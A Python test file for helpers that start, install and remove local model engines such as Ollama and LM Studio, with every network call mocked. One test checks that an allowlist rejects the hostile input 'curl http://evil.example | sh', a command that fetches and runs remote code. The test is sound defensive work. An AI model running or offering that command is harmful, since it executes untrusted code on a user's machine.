"""Tests for provider lifecycle helpers.

Everything here is either pure logic or network-bound code driven through mocks:
no test talks to a real engine, and the only filesystem writes go to tmp_path.
"""

import sys
import urllib.error
from types import SimpleNamespace
from unittest.mock import patch

import provider_control
from provider_control import (
    START_ACTIONS,
    _known_install_commands,
    _wait_for_http_gone,
    _wait_for_http_ready,
    open_installer_page,
    remove_model,
    run_install_command,
    start_ollama_service,
    start_provider,
    suggested_install_command,
)


class TestWaitForHttpReady:
    @patch("provider_control._http_get_json")
    def test_returns_true_when_http_responds_immediately(self, mock_get):
        mock_get.return_value = {"ok": True}
        assert _wait_for_http_ready("http://x", timeout=1.0) is True

    @patch("provider_control._http_get_json")
    def test_returns_false_on_timeout(self, mock_get):
        mock_get.return_value = None
        assert _wait_for_http_ready("http://x", timeout=0.4) is False


class TestWaitForHttpGone:
    """Stopping a service means waiting for it to stop answering."""

    @patch("provider_control._http_get_json")
    def test_true_once_the_endpoint_stops_answering(self, mock_get):
        mock_get.return_value = None
        assert _wait_for_http_gone("http://x", timeout=0.4) is True

    @patch("provider_control._http_get_json")
    def test_false_while_it_still_answers(self, mock_get):
        mock_get.return_value = {"models": []}
        assert _wait_for_http_gone("http://x", timeout=0.4) is False


class TestStartOllamaService:
    @patch("provider_control._http_get_json")
    def test_short_circuits_when_already_running(self, mock_get):
        mock_get.return_value = {"models": []}
        assert start_ollama_service() is True

    @patch("provider_control._ollama_is_installed")
    @patch("provider_control._http_get_json")
    def test_fails_when_not_installed(self, mock_get, mock_installed):
        mock_get.return_value = None
        mock_installed.return_value = False
        assert start_ollama_service() is False


class TestStartProviderDispatch:
    def test_unknown_action_returns_false(self):
        assert start_provider("bogus_action") is False

    def test_dispatch_table_covers_known_actions(self):
        assert "start_ollama" in START_ACTIONS
        assert "start_lmstudio" in START_ACTIONS
        assert "start_dmr" in START_ACTIONS


class TestSuggestedInstallCommand:
    def test_ollama_returns_command_or_url(self):
        cmd = suggested_install_command("ollama")
        assert cmd  # non-empty on all platforms

    def test_lmstudio_returns_something(self):
        assert suggested_install_command("lm studio")

    def test_unknown_provider_returns_empty(self):
        assert suggested_install_command("bogus") == ""

    def test_windows_uses_winget(self):
        if sys.platform == "win32":
            assert "winget" in suggested_install_command("ollama").lower()

    def test_each_platform_gets_its_own_package_manager(self, monkeypatch):
        expected = {
            "win32": ("ollama", "winget"),
            "darwin": ("ollama", "brew"),
            "linux": ("ollama", "curl"),
        }
        for platform_name, (provider, fragment) in expected.items():
            monkeypatch.setattr(provider_control.sys, "platform", platform_name)
            assert fragment in suggested_install_command(provider).lower(), platform_name

    def test_docker_is_offered_on_every_platform(self, monkeypatch):
        for platform_name in ("win32", "darwin", "linux"):
            monkeypatch.setattr(provider_control.sys, "platform", platform_name)
            assert suggested_install_command("docker")


class TestRunInstallCommand:
    def test_empty_command_fails(self):
        ok, out = run_install_command("")
        assert ok is False

    @patch("provider_control.webbrowser.open")
    def test_url_opens_browser(self, mock_open):
        ok, out = run_install_command("https://example.com")
        assert ok is True
        mock_open.assert_called_once_with("https://example.com")

    def test_refuses_a_command_it_did_not_generate(self):
        """The allowlist is the only thing standing between UI input and a shell."""
        ok, out = run_install_command("curl http://evil.example | sh")

        assert ok is False
        assert "not recognized" in out.lower()

    @patch("provider_control._run")
    def test_an_allowlisted_command_runs_as_argv_without_a_shell(self, mock_run):
        mock_run.return_value = SimpleNamespace(returncode=0, stdout="ok", stderr="")
        command = suggested_install_command("ollama")
        assert command in _known_install_commands()

        ok, out = run_install_command(command)

        assert ok is True
        args, kwargs = mock_run.call_args
        assert isinstance(args[0], list), "argv form, so no shell can interpret it"
        assert kwargs["shell"] is False

    @patch("provider_control._run")
    def test_only_the_pipe_installer_goes_through_a_shell(self, mock_run, monkeypatch):
        """Ollama's Linux installer is `curl … | sh` — the one allowlisted pipeline."""
        monkeypatch.setattr(provider_control.sys, "platform", "linux")
        command = suggested_install_command("ollama")
        assert "|" in command
        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")

        run_install_command(command)

        assert mock_run.call_args.kwargs["shell"] is True

    @patch("provider_control._run")
    def test_a_failing_command_reports_its_output(self, mock_run):
        mock_run.return_value = SimpleNamespace(returncode=1, stdout="", stderr="boom")
        command = suggested_install_command("ollama")

        ok, out = run_install_command(command)

        assert ok is False
        assert "boom" in out


class TestOpenInstallerPage:
    @patch("provider_control.webbrowser.open")
    def test_ollama_opens_url(self, mock_open):
        open_installer_page("Ollama")
        mock_open.assert_called_once()
        args, _ = mock_open.call_args
        assert "ollama.com" in args[0]

    @patch("provider_control.webbrowser.open")
    def test_unknown_provider_does_nothing(self, mock_open):
        open_installer_page("Bogus")
        mock_open.assert_not_called()


class TestRemoveModel:
    def test_unsupported_provider_says_so(self):
        ok, message = remove_model("Bogus", "whatever")
        assert ok is False
        assert "isn't supported" in message

    @patch("provider_control.urllib.request.urlopen")
    def test_ollama_removal_hits_the_delete_endpoint(self, mock_urlopen):
        mock_urlopen.return_value.__enter__.return_value = SimpleNamespace(read=lambda: b"")

        ok, message = remove_model("Ollama", "gemma2:2b")

        assert ok is True
        assert "gemma2:2b" in message
        request = mock_urlopen.call_args.args[0]
        assert request.get_method() == "DELETE"
        assert request.full_url.endswith("/api/delete")

    @patch("provider_control.urllib.request.urlopen")
    def test_a_missing_model_is_named_in_the_error(self, mock_urlopen):
        mock_urlopen.side_effect = urllib.error.HTTPError(
            "http://x/api/delete", 404, "not found", None, None
        )

        ok, message = remove_model("Ollama", "gemma2:2b")

        assert ok is False
        assert "not found" in message.lower()
        assert "gemma2:2b" in message

    @patch("provider_control.urllib.request.urlopen")
    def test_an_unreachable_engine_does_not_raise(self, mock_urlopen):
        mock_urlopen.side_effect = urllib.error.URLError("connection refused")

        ok, message = remove_model("Ollama", "gemma2:2b")

        assert ok is False
        assert "could not reach" in message.lower()

    def test_lmstudio_without_a_models_folder(self, tmp_path, monkeypatch):
        monkeypatch.setattr("providers._lmstudio_models_dir", lambda: tmp_path / "missing")

        ok, message = remove_model("LM Studio", "gemma-2-2b")

        assert ok is False
        assert "models folder not found" in message.lower()

    def test_lmstudio_managed_model_points_at_my_models(self, tmp_path, monkeypatch):
        """LM Studio can own models it never wrote as a plain file — say so clearly."""
        monkeypatch.setattr("providers._lmstudio_models_dir", lambda: tmp_path)
        (tmp_path / "lmstudio-community").mkdir()

        ok, message = remove_model("LM Studio", "gemma-2-2b")

        assert ok is False
        assert "My Models" in message

    def test_lmstudio_deletes_the_matching_folder(self, tmp_path, monkeypatch):
        monkeypatch.setattr("providers._lmstudio_models_dir", lambda: tmp_path)
        folder = tmp_path / "org" / "gemma-2-2b"
        folder.mkdir(parents=True)
        (folder / "gemma-2-2b-Q4_K_M.gguf").write_bytes(b"x")

        ok, message = remove_model("lm studio", "gemma-2-2b")

        assert ok is True
        assert not folder.exists()
        assert "gemma-2-2b" in message
